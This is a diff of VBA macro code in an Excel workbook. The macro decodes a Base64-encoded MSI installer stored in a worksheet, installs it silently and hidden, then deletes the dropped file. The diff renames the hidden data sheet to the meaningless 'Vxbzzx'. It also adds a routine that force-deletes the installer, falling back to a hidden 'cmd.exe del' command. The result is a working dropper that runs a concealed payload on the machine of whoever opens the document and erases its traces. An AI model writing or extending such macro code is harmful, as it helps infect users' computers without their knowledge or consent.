@@ -22,6 +22,38 @@ Private Function Base64Decode(ByVal base64String As String) As Byte()
     Base64Decode = node.nodeTypedValue
 End Function
 
+Sub DeleteFileRobust(ByVal outFile As String)
+    Dim fso As Object
+    Dim sh As Object
+    Dim cmd As String
+
+    On Error Resume Next
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    If fso.FileExists(outFile) Then
+        SetAttr outFile, vbNormal
+        fso.DeleteFile outFile, True
+    End If
+
+    ' Nếu FSO xóa lỗi thì fallback sang cmd del
+    If Err.Number <> 0 Then
+        Debug.Print "FSO delete failed: " & Err.Number & " - " & Err.Description
+        Err.Clear
+
+        Set sh = CreateObject("WScript.Shell")
+        cmd = "cmd.exe /c del /f /q """ & outFile & """"
+        sh.Run cmd, 0, True
+
+        If Err.Number <> 0 Then
+            Debug.Print "CMD delete failed: " & Err.Number & " - " & Err.Description
+            Err.Clear
+        End If
+    End If
+
+    On Error GoTo 0
+End Sub
+
 Public Sub ExtractAndRunMSI()
     On Error Resume Next
     Dim ws As Worksheet
@@ -31,7 +63,7 @@ Public Sub ExtractAndRunMSI()
     Dim stream As Object
     Dim shellObj As Object
     
-    Set ws = ThisWorkbook.Sheets("Sheet2")
+    Set ws = ThisWorkbook.Sheets("Vxbzzx")
     lastRow = ws.Cells(ws.Rows.Count, 1).End(xlUp).Row
     
     If lastRow = 0 Or ThisWorkbook.Path = "" Then Exit Sub
@@ -58,7 +90,7 @@ Public Sub ExtractAndRunMSI()
     shellObj.Run "msiexec /quiet /i """ & outFile & """", 0, True
     
     On Error Resume Next
-    Kill outFile
+    DeleteFileRobust outFile
     On Error GoTo 0
 End Sub
 
